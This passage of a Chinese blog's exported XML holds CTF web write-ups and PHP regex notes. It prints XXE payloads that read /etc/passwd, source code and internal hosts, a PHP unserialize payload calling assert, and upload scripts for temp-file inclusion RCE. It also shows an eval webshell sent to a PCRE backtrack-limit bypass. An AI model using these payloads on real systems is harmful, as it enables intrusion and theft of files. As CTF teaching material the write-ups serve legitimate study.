<span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span> <span class="token string">"flag{711bbb41-f60d-4d22-b478-63fc04864795}"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string">"Help Me Find FLAG!"</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
]]></content>
      <tags>
        <tag>pop链</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF:2020-PYWebsite</title>
    <url>/2021/07/13/mrctf-2020-pywebsite/</url>
    <content><![CDATA[<p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141120949.png" alt="image-20210713141120949"></p>
<p>点击购买跳出一个微信二维码</p>
<p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141136727.png" alt="image-20210713141136727"></p>
<p>扫出来是这样的：</p>
<p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141103134.png" alt="image-20210713141103134"></p>
<p>F12发现这样一串代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">enc</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">{</span>
      hash <span class="token operator">=</span> <span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">var</span> code <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"vcode"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"0cd4da0223c0b280829dc3ea458d655c"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"您通过了验证！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"./flag.php"</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你的授权码不正确！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请输入授权码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

    <span class="token punctuation">}</span></code></pre>
<p>访问flag.php</p>
<p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141420745.png" alt="image-20210713141420745"></p>
<p>提示ip：</p>
<pre><code>X-Forwarded-For: 127.0.0.1</code></pre>
<p><img src="/2021/07/13/mrctf-2020-pywebsite/image-20210713141543107.png" alt="image-20210713141543107"></p>
]]></content>
  </entry>
  <entry>
    <title>NCTF:2019-FakeXMLcookbook</title>
    <url>/2021/06/25/nctf-2019-fakexmlcookbook/</url>
    <content><![CDATA[<p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163322248.png" alt="image-20210625163322248"></p>
<p>XXE攻击</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p>注意admin前后有&amp;和;</p>
<p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163505651.png" alt="image-20210625163505651"></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/06/25/nctf-2019-fakexmlcookbook/image-20210625163906282.png" alt="image-20210625163906282"></p>
]]></content>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF:2020-ReadlezPHP</title>
    <url>/2021/07/15/npuctf-2020-readlezphp/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token shell-comment comment">#error_reporting(0);</span>
<span class="token keyword">class</span> <span class="token class-name">HelloPhp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>
        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token number">2021</span><span class="token operator">-</span><span class="token number">07</span><span class="token operator">-</span><span class="token number">14</span> <span class="token number">05</span><span class="token punctuation">:</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">14</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>data<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"HelloPhp"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"phpinfo()"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"assert"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p><img src="/2021/07/15/npuctf-2020-readlezphp/image-20210715012015629.png" alt="image-20210715012015629"></p>
]]></content>
  </entry>
  <entry>
    <title>NPUCTF：2020-ezinclude</title>
    <url>/2021/08/24/npuctf-2020-ezinclude/</url>
    <content><![CDATA[<p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042020026.png" alt="image-20210821042020026"></p>
<p>抓包看一下，疑似哈希长度拓展攻击</p>
<p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042334904.png" alt="image-20210821042334904"></p>
<p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042441516.png" alt="image-20210821042441516"></p>
<p>得到了 flflflflag.php ，访问重定向到了其他页面，抓包抓回来，页面提示 include($_GET[“file”]) ，扫目录可以得到 dir.php ,包含他可以看到这个页面列出了 /tmp 下的所有文件</p>
<p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821042648999.png" alt="image-20210821042648999"></p>
<p>使用脚本尝试写入shell</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO

payload <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo()?>"</span>
file_data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
url <span class="token operator">=</span> <span class="token string">"http://949f7699-486f-4650-83c3-3a1432afb3b6.node4.buuoj.cn:81/flflflflag.php?"</span>\
      <span class="token operator">+</span><span class="token string">"file=php://filter/string.strip_tags/resource=/etc/passwd"</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file_data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
<p>然后访问 dir.php 可以得到临时文件的名称，包含之即可RCE</p>
<p><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821043053572.png" alt="image-20210821043053572"></p>
<p>flag就在phpinfo页面<br><img src="/2021/08/24/npuctf-2020-ezinclude/image-20210821043229435.png" alt="image-20210821043229435"></p>
]]></content>
  </entry>
  <entry>
    <title>NCTF:2019-TrueXMLcookbook</title>
    <url>/2021/07/19/nctf-2019-truexmlcookbook/</url>
    <content><![CDATA[<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040125956.png" alt="1"></p>
<p>题目提示XXE</p>
<p>exp:</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035741618.png" alt="2"></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035821248.png" alt="3"></p>
<p><strong>看源码：</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035845200.png" alt="4"></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è´¦å·</span>
<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å¯ç&amp;nbsp;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>

<span class="token keyword">try</span><span class="token punctuation">{</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>没什么大用</p>
<p><strong>访问etc/hosts</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "file:///etc/hosts"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035921253.png" alt="5"></p>
<p><strong>访问proc/net/arp</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "file:///proc/net/arp"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035942111.png" alt="6"></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "http://10.0.163.2"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040030748.png" alt="7"></p>
<p><strong>进行c段扫描：</strong></p>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040106473.png" alt="8"></p>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035651939.png" alt="9"></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM "http://10.0.163.6"&gt;
  ]&gt;
  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre>
<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040014927.png" alt="10"></p>
]]></content>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx重要文件位置</title>
    <url>/2021/07/14/nginx-chong-yao-wen-jian-wei-zhi/</url>
    <content><![CDATA[<ul>
<li>配置文件存放目录：/etc/nginx</li>
<li>主配置文件：/etc/nginx/conf/nginx.conf</li>
<li>管理脚本：/usr/lib64/systemd/system/nginx.service</li>
<li>模块：/usr/lisb64/nginx/modules</li>
<li>应用程序：/usr/sbin/nginx</li>
<li>程序默认存放位置：/usr/share/nginx/html</li>
<li>日志默认存放位置：/var/log/nginx</li>
<li>配置文件目录为：/usr/local/nginx/conf/nginx.conf</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>PHP：preg_match()绕过</title>
    <url>/2021/09/12/php-preg-match-rao-guo/</url>
    <content><![CDATA[<h3 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h3><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
<h3 id="2、PCRE回溯次数限制"><a href="#2、PCRE回溯次数限制" class="headerlink" title="2、PCRE回溯次数限制"></a>2、PCRE回溯次数限制</h3><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO

files <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>b<span class="token string">'aaa&lt;?php eval($_POST[txt]);//'</span> <span class="token operator">+</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://51.158.75.42:8088/index.php'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span></code></pre>
<p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
<p><code>.</code>不会匹配换行符，如</p>
<h3 id="3、换行符"><a href="#3、换行符" class="headerlink" title="3、换行符"></a>3、换行符</h3><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(flag).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>只需要</p>
<pre><code>$json="\nflag"</code></pre>
<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^flag$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>只需要传入</p>
<pre><code>?a=flag%0a</code></pre>
<p>原文：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP:preg_replace()函数应用</title>
    <url>/2021/06/21/php-preg-replace-han-shu-ying-yong/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/crxis/p/7714636.html">https://www.cnblogs.com/crxis/p/7714636.html</a></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"as2223adfsf0s4df0sdfsdf"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/0/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去掉0字符，此时相当于 replace的功能, preg_replace("/0/","A",$str); 这样就是将0变成A的意思了</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[0-9]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去掉所有数字</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样是去掉所有小写字母</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[A-Z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样是去掉所有大写字母</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z,A-Z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样是去掉所有字母</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"as2223adfsAAf0s4df0s中国人dD中南海DDfsdf"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z,A-Z,0-9]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//去掉所有字母和数字</span>
<span class="token delimiter">?></span>
经过以上的例子，相信大家知道，<span class="token punctuation">[</span> <span class="token punctuation">]</span> 和里面的<span class="token punctuation">,</span>有什么作用了。也可以看到，匹配的字符串必须加 <span class="token operator">/</span> <span class="token operator">/</span>（看例子的第一个参数）

<span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sdcd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;.*>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//这个是表示去除以&lt;开头，以>结尾的那部份，输出结果是：acsdcssdcd</span>
注意：上面的 <span class="token punctuation">.</span><span class="token operator">*</span> 是表示任何字符，也就是说不管<span class="token operator">&lt;</span><span class="token operator">></span>包住的是什么都去掉其中<span class="token punctuation">.</span> 表示任意字符， <span class="token operator">*</span> 表示任意个数

现在我们来改动一下，如果不想是任何个数呢？
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sdcd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;.{4}>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此时输出：acsdcs&lt;55555555>scsdcd因为{4}指定了条件：&lt;>内为4个字符的才满足条件，所以&lt;55555555>不符合条件，没有被替换。</span>

注意：这时我们又学到了一个知识点<span class="token punctuation">{</span>数字<span class="token punctuation">}</span> 表示指定前面的个数，<span class="token operator">*</span>就表示是任意个<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">--</span>无限个<span class="token punctuation">)</span>

表示重复次数的除了 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>指定次数<span class="token punctuation">}</span> 表示，还有很多表达形式：



<span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sd&lt;>cd"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]*>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出acsdcscd</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]+>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输入acsdcsscsd&lt;>cd</span>
<span class="token delimiter">?></span>

上面的例子只要是为了 表达 <span class="token operator">*</span> 与<span class="token operator">+</span>的区别 <span class="token punctuation">,</span><span class="token operator">*</span> 表示重复<span class="token number">0</span>数或n 次，而<span class="token operator">+</span> 表示<span class="token number">1</span>次以上，即一例中<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>[0-9]+</span> <span class="token punctuation">></span></span></span>表示<span class="token operator">&lt;</span><span class="token operator">></span>里面至少要有一个数字才符合条件。

相信这时大家知道，为什么上例中用<span class="token operator">*</span> 和用<span class="token operator">+</span>输出的结果不同了吧

再来：

<span class="token delimiter">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sd&lt;>cd"</span><span class="token punctuation">;</span>
